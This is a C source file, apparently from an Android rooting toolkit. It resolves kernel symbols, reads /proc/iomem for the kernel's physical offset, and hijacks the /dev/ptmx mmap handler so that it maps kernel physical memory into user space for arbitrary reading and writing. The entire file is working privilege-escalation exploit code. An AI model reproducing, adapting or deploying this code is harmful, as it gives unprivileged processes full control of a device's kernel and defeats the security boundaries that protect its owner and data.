#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "exploit.h"
#include "kallsyms.h"
#include "mm.h"
#include "ptmx.h"
#include "libdiagexploit/diag.h"
#include "device_database/device_database.h"


static unsigned long int kernel_phys_offset;

int (*remap_pfn_range)(struct vm_area_struct *, unsigned long addr,
                       unsigned long pfn, unsigned long size, pgprot_t);

bool
setup_remap_pfn_range_address(void)
{
  if (remap_pfn_range) {
    return true;
  }

  remap_pfn_range = (void *)device_get_symbol_address(DEVICE_SYMBOL(remap_pfn_range));

  if (!remap_pfn_range && kallsyms_exist()) {
    remap_pfn_range = kallsyms_get_symbol_address("remap_pfn_range");
  }

  return !!remap_pfn_range;
}

void
set_kernel_phys_offset(unsigned long int offset)
{
  kernel_phys_offset = offset;
}

#define PAGE_SHIFT  12

void *
convert_to_kernel_address(void *address, void *mmap_base_address)
{
  return address - mmap_base_address + (void*)PAGE_OFFSET;
}

void *
convert_to_mmaped_address(void *address, void *mmap_base_address)
{
  return mmap_base_address + (address - (void*)PAGE_OFFSET);
}

static bool
detect_kernel_phys_parameters(void)
{
  FILE *fp;
  void *system_ram_address;
  char name[BUFSIZ];
  void *start_address, *end_address;
  int ret;

  system_ram_address = NULL;

  fp = fopen("/proc/iomem", "r");
  if (!fp) {
    printf("Failed to open /proc/iomem due to %s.\n", strerror(errno));
    return false;
  }

  while ((ret = fscanf(fp, "%p-%p : %[^\n]", &start_address, &end_address, name)) != EOF) {
    if (!strcmp(name, "System RAM")) {
      system_ram_address = start_address;
      continue;
    }
    if (!strncmp(name, "Kernel", 6)) {
      break;
    }
  }
  fclose(fp);

  set_kernel_phys_offset((int)system_ram_address);

  return true;
}

int
ptmx_mmap(struct file *filep, struct vm_area_struct *vma)
{
  return remap_pfn_range(vma, vma->vm_start,
                         kernel_phys_offset >> PAGE_SHIFT,
                         vma->vm_end - vma->vm_start, vma->vm_page_prot);
}

static bool
run_callback_with_mmap(void *user_data)
{
  int fd;
  void *address;
  void *start_address = (void *)0x20000000;
  mmap_callback_t callback = (mmap_callback_t)user_data;
  bool ret;

  fd = open(PTMX_DEVICE, O_RDWR);
  address = mmap(start_address, KERNEL_SIZE,
                 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED,
                 fd, 0);
  if (address == MAP_FAILED) {
    printf("Failed to mmap /dev/ptmx due to %s.\n", strerror(errno));
    close(fd);
    return false;
  }

  ret = callback(address, KERNEL_SIZE);

  munmap(address, KERNEL_SIZE);

  close(fd);

  return ret;
}

typedef struct _callback_mmap_exploit_info_t {
  mmap_callback_t func;
  bool result;
} callback_mmap_exploit_info_t;

static bool
run_callback_mmap_exploit(void *address, size_t length, void *param)
{
  callback_mmap_exploit_info_t *info = param;

  info->result = info->func(address, length);

  return true;
}

static bool
run_exploit_mmap(mmap_callback_t callback, bool *result)
{
  callback_mmap_exploit_info_t info;

  info.func = callback;

  if (attempt_mmap_exploit(&run_callback_mmap_exploit, &info)) {
    *result = info.result;
    return true;
  }

  return false;
}

bool
run_with_mmap(mmap_callback_t callback)
{
  unsigned long int kernel_physical_offset;
  bool result;

  if (run_exploit_mmap(callback, &result)) {
    return result;
  }

  setup_remap_pfn_range_address();

  if (!remap_pfn_range) {
    printf("You need to manage to get remap_pfn_range addresses.\n");
    return false;
  }

  setup_ptmx_fops_mmap_address();
  if (!ptmx_fops_mmap_address) {
    printf("You need to manage to get ptmx_fops addresses.\n");
    return false;
  }

  kernel_physical_offset = device_get_symbol_address(DEVICE_SYMBOL(kernel_physical_offset));
  if (kernel_physical_offset) {
    set_kernel_phys_offset(kernel_physical_offset - 0x00008000);
  }
  else if (!detect_kernel_phys_parameters()) {
    printf("You need to manage to get kernel_physical_offset addresses.\n");
    return false;
  }

  return attempt_exploit(ptmx_fops_mmap_address,
                         (unsigned long int)&ptmx_mmap, 0,
			 run_callback_with_mmap, callback);
}
